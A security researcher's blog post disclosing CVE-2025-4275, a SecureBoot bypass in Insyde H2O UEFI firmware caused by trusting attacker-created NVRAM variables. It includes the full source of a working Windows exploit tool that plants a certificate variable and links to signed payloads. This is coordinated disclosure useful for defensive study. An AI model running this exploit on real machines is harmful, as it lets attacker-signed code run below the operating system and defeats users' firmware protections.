---
title: "Hydroph0bia (CVE-2025-4275) - a trivial SecureBoot bypass for UEFI-compatible firmware based on Insyde H2O, part 1"
---

![Hydroph0bia logo](../hydroph0bia-part1/hp1_logo.png)

This post will be about a vulnerability I dubbed Hydroph0bia (as a pun on Insyde H2O) aka CVE-2025-4275 or INSYDE-SA-2025002. 

# Intro
Once upon an evening a relative handed me over his [HUAWEI Matebook 14 2023](https://consumer.huawei.com/sa-en/laptops/matebook-14-2023/specs/), an entry-level PC laptop based on Intel Core i5-1240P and running Insyde H2O-based UEFI-compatible firmware with SecureBoot, firmware password, and other security features expected from a modern PC. 

I had a ton of free time after leaving California and returning to Germany, and my UEFI reversing skills got a bit rusty and needed a refresh, so I decided to invest some time into checking how robust those security technologies really are against somewhat capable and/or experienced attacker. 

The result is self evident - **they sadly are not**. The firmware can be persuaded to trust any arbitrary external application or capsule signed by arbitrary certificate, and the only capabilities required for it are "can put files onto EFI System Partition" and "can create new NVRAM variables", both of which are achievable by a local privilege escalation[^1] in Windows or Linux. 

# NVRAM?
As all of you might already know, UEFI provides an abstract interface to a non-volatile variable storage it calls NVRAM (Non-Volatile Random Access Memory). The interface itself is very old (a vintage of [Intel Boot Initiative of 1998](https://vzimmer.blogspot.com/2018/10/ghosts-of.html)), prone to [many issues big and small](https://www.binarly.io/blog/efixplorer-hunting-uefi-firmware-nvram-vulnerabilities), and is _an API so nice you have to call it twice_. 

It is also prone to an issue I've discovered a while ago and [ranted about on Twitter](https://x.com/NikolajSchlej/status/1584456875126362112) - _"shadowing"_, a situation where a non-volatile variable with a given name and GUID can both prevent creation of a volatile variable with the same name and GUID (which immediately defeats the _"attributes are a part of the key"_ assertion made by UEFI specification), and be consumed instead said volatile variable (that could not have been created previously, because a non-volatile one already exists) at any place where the volatile variable had been expected.

**Spoiler alert**: the vulnerability I'm describing here is **exactly** of this kind, and it could not be possible without UEFI NVRAM interface being a mess (storing _volatile_ variables in a storage with _Non-Volatile_ in the name is both ironic and dangerous, but probably just fine for 1998).

> It would seem the universe does not like its peas mixed with its porridge. [Rosalind Lutece, Bioshock Infinite](https://bioshock.fandom.com/wiki/The_Source_of_Her_Power)

# SecureBoot?
Another quirk of early days of UEFI is that the ability to verify signatures on applications and drivers coming from outside of the firmware had not originally been present in EFI 1.1 or UEFI 2.0, but was added (with a heavy push by Microsoft) later in 2012, almost a full year after the whole PC industry moved to UEFI-compatible firmware. This means that every IBV (Independent BIOS Vendor) had to invent a firmware update subsystem for their platform first, then make it work reliably enough to be released to the world, then, after a year, marry it with SecureBoot, SMM-based SetVariable, new kinds of authenticated NVRAM variables, and all the other tech required to support SecureBoot in a spec-compliant way.

This situation lead to stuff being rushed out of the door in a rather sorry state, many edge cases (like using TE image format instead of PE) being completely untested, Authenticode verification code being broken in many ways and prone to integer overflows at every arithmetic operation, etc.

# Vulnerability?
I've stalled long enough for the actual vulnerability details, now it is time to dig into the issue. But first, a super-quick refresher on how SecureBoot works in any Insyde H2O-based firmware:
- A driver called BdsDxe enumerates all things that need to be executed from outside of the firmware, and are therefore untrusted - Option ROMs, UEFI drivers, UEFI applications and the OS bootloader that needs to be executed after the firmware is done with itself.
- To actually perform the Authenticode signature verification BdsDxe calls into another driver - SecurityStubDxe (let the name not deceive you, there's nothing _stub_ about it), then depending on the results either transfers control to that verified thing, or ignores it silently, or loudly complains to the user about SecureBoot failure. This uses the spec-defined authenticated NVRAM variables relevant to SecureBoot - _db_, _dbx_, _KEK_, _PK_, _SetupMode_ and so on.
- The firmware update mechanism is also using an UEFI application called _isflash.bin_, that the updater application in the OS places onto EFI System Partition together with the update capsule. The UEFI application is signed by an Insyde certificate, and the public portion of it is stored inside the DXE volume.
- However, it is BdsDxe that reads the signing certificate for the firmware updater, and SecurityStubDxe that performs Authenticode verification, so there needs to be a mechanism for BdsDxe to relay the certificate to SecurityStubDxe, yet out of all the available options Insyde engineers from 2012 choose one of the worst - **NVRAM**.

The expected way the firmware update should work is as follows:
1. A driver called SecureFlashDxe sets a trigger variable for BdsDxe to load a certificate into a volatile NVRAM variable.

2. BdsDxe does that by setting two variables - _SecureFlashSetupMode_  trigger, and _SecureFlashCertData_ with a certificate in EFI_SIGNATURE_LIST format.
![LoadCertificateToVariable function in BdsDxe decompiled by IDA 9.1 with efiXplorer](../hydroph0bia-part1/hp1_loadcerts.png)
3. SecurityStubDxe reads the trigger and the certificate and if they are both present attempts the verification process. It does not check either variables to be volatile or non-volatile, and uses a library function to read them instead of calling the GetVariable runtime service directly.
![VerifyBySecureFlashSignature function in SecurityStubDxe decompiled by IDA 9.1 with efiXplorer](../hydroph0bia-part1/hp1_verify.png)

_What could go wrong here?_ Well, if we are able to create our own non-volatile _SecureFlashSetupMode_ and _SecureFlashCertData_ without triggering any other steps above, SecurityStubDxe will happily see those as if BdsDxe created them, and will blindly trust anything that is correctly signed with the provided certificate, bypassing both SecureBoot and Insyde signature check on _isflash.bin_.

I wrote a small Windows program to do so, here it is in full:
```cpp
#include <windows.h>

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

static unsigned char esl[] = {
    0xa1, 0x59, 0xc0, 0xa5, 0xe4, 0x94, 0xa7, 0x4a, 0x87, 0xb5, 0xab, 0x15,
    ...
    0xb4, 0xf5, 0x2d, 0x68, 0xe8
};
const unsigned int esl_len = 857;

static const char* trigger_var = "SecureFlashSetupMode";
static const char* cert_var = "SecureFlashCertData";
static const char* guid = "{382AF2BB-FFFF-ABCD-AAEE-CCE099338877}";
static char trigger = 1;

static void obtain_privilege()
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    
    OpenProcessToken(GetCurrentProcess(), 
         TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    LookupPrivilegeValue(NULL, 
         SE_SYSTEM_ENVIRONMENT_NAME, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
}

int main(int argc, char *argv[]) 
{
    if (argc != 2) {
        printf("Usage: sfcd set   - set the hardcoded certificate "
               "and trigger NVRAM variables\n"
               "       sfcd clear - clear the currently set certificate "
               "and trigger NVRAM variables\n\n");

        return EXIT_SUCCESS;
    }

    obtain_privilege();
    
    // Set variables
    if (memcmp(argv[1], "set", 4) == 0) {
        if (SetFirmwareEnvironmentVariableA(cert_var, guid, esl, esl_len)) {
            printf("%s had been set\n", cert_var);
        }
        else {
            printf("Failed to set %s, code %u\n", cert_var, 
                 (unsigned)GetLastError());
            return EXIT_FAILURE;
        }

        if (SetFirmwareEnvironmentVariableA(trigger_var, guid, 
               &trigger, sizeof(trigger))) {
            printf("%s had been set\n", trigger_var);
        }
        else {
            printf("Failed to set %s, code %u\n", trigger_var, 
                 (unsigned)GetLastError());
            return EXIT_FAILURE;
        }
    }
    // Clear variables
    else if (memcmp(argv[1], "clear", 6) == 0) {
        if (SetFirmwareEnvironmentVariableA(cert_var, guid, esl, 0)) {
            printf("%s had been cleared\n", cert_var);
        }
        else {
            printf("Failed to clear %s: %u\n", cert_var, 
                 (unsigned)GetLastError());
            return EXIT_FAILURE;
        }

        if (SetFirmwareEnvironmentVariableA(trigger_var, guid, &trigger, 0)) {
            printf("%s had been cleared\n", trigger_var);
        }
        else {
            printf("Failed to clear %s: %u\n", trigger_var, 
                 (unsigned)GetLastError());
            return EXIT_FAILURE;
        }
    }
    else {
        printf("Unknown command\n");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
```
Running this tool on Windows from Administrator makes the firmware trust everything signed by our certificate, including UEFI drivers that we can then run rather early in BDS phase by using the DriverXXXX mechanism. Here is an example of using a signed CrScreenshotDxe driver to get a screenshot from BIOS Setup screen with SecureBoot enabled.
![Screenshot of BIOS Setup screen with SecureBoot enabled](../hydroph0bia-part1/hp1_screenshot.png)

# Outro
This post is a result of coordinated responsible disclosure with [CERT Coordination Center](https://www.kb.cert.org/vuls/).
I would like to thank Vijay Sarvepalli (Security Solutions Architect, Carnegie Mellon University) for his help with reporting and coordination, and Tim Lewis (CTO, Insyde Software) for promptly fixing the vulnerability after my initial report 90 days ago. 

I'd like to also thank Alex Matrosov and his team at [Binarly.io](https://binarly.io) for their hard work on improving UEFI security in general, and for development and support of [efiXplorer](https://github.com/binarly-io/efiXplorer), that makes reversing UEFI components much more fun and much less challenging.

There will be a part two of this post where we'll [use the vulnerability to hijack the firmware update process and obtain full control over the DXE volume](https://youtu.be/1uJF44S0LQw). Stay tuned.

# Links
SFCD tool [source](https://github.com/NikolajSchlej/Hydroph0bia/blob/main/sfcd/sfcd.c) and [binary](https://github.com/NikolajSchlej/Hydroph0bia/blob/main/sfcd/SFCD.exe), original [BIOS region dump](https://github.com/NikolajSchlej/Hydroph0bia/blob/main/bios_images/original.bin), and custom-cert-signed [UEFI Shell](https://github.com/NikolajSchlej/Hydroph0bia/blob/main/signed/shell_signed.efi) and [CrScreenshotDxe](https://github.com/NikolajSchlej/Hydroph0bia/blob/main/signed/crscreenshotdxe_signed.efi) are on GitHub.

{{ hr(data_content="footnotes") }}

[^1]: it is useful to assume the OS to be under full attacker control for any kind of firmware security research, with LPEs being dirt-cheap and users still willing to run unknown software downloaded directly from the Web that barrier of entry might as well not exist.

